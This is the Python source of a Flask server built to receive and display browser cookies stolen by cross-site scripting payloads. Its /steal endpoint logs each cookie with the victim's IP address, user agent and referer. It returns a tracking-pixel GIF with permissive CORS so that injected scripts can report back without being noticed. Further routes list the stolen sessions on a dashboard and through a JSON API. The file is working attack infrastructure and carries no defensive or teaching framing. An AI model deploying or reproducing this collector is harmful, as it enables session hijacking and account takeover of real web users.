from flask import Flask, request, jsonify, render_template
from datetime import datetime
import json

app = Flask(__name__)

stolen_cookies = []

SERVER_START_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')


@app.route('/')
def index():
    """Display all stolen cookies"""
    return render_template(
        'index.html',
        cookies=reversed(stolen_cookies),
        total=len(stolen_cookies),
        server_start=SERVER_START_TIME
    )


@app.route('/steal', methods=['GET', 'POST'])
def steal_cookie():
    """
    Endpoint that receives stolen cookies from XSS payloads
    Accepts both GET and POST requests
    """
    cookie_data = None
    
    if request.method == 'GET':
        cookie_data = request.args.get('cookie') or request.args.get('c')
    elif request.method == 'POST':
        cookie_data = request.form.get('cookie') or request.json.get('cookie') if request.is_json else None
    
    if not cookie_data:
        cookie_data = request.args.get('data') or str(dict(request.args))

    entry = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'cookie': cookie_data or 'No cookie data',
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
        'referer': request.headers.get('Referer'),
        'method': request.method
    }
    
    stolen_cookies.append(entry)

    print(f"\n{'='*60}")
    print(f"[ALERT] NEW STOLEN COOKIE RECEIVED")
    print(f"{'='*60}")
    print(f"Timestamp: {entry['timestamp']}")
    print(f"Cookie: {entry['cookie']}")
    print(f"IP: {entry['ip']}")
    print(f"User-Agent: {entry['user_agent']}")
    print(f"Referer: {entry['referer']}")
    print(f"Method: {entry['method']}")
    print(f"{'='*60}\n")
    
    return ('GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00'
            '\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,'
            '\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'), 200, {
        'Content-Type': 'image/gif',
        'Access-Control-Allow-Origin': '*'
    }


@app.route('/api/cookies', methods=['GET'])
def api_get_cookies():
    """API endpoint to retrieve stolen cookies as JSON"""
    return jsonify({
        'total': len(stolen_cookies),
        'cookies': stolen_cookies
    })


@app.route('/clear', methods=['POST'])
def clear_cookies():
    """Clear all stolen cookies"""
    global stolen_cookies
    stolen_cookies = []
    print("\n[INFO] All stolen cookies cleared\n")
    return jsonify({'status': 'cleared'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888, debug=False)
